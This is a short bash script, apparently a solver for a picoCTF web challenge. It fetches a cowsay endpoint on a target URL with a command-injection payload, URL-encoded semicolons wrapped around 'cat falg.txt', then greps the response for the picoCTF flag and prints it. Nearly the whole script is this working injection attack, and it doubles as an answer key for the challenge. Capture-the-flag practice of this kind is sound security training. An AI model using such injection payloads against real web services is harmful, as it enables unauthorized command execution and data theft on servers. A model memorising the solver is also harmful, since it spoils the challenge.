# Clear dump
if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null

webLink=$1
wget --quiet "$webLink""cowsay/flag%3Bcat%20falg.txt%3B"
flag=$(grep -or --no-filename --color=never picoCTF{.*})

popd > /dev/null

# print the flag
echo $flag
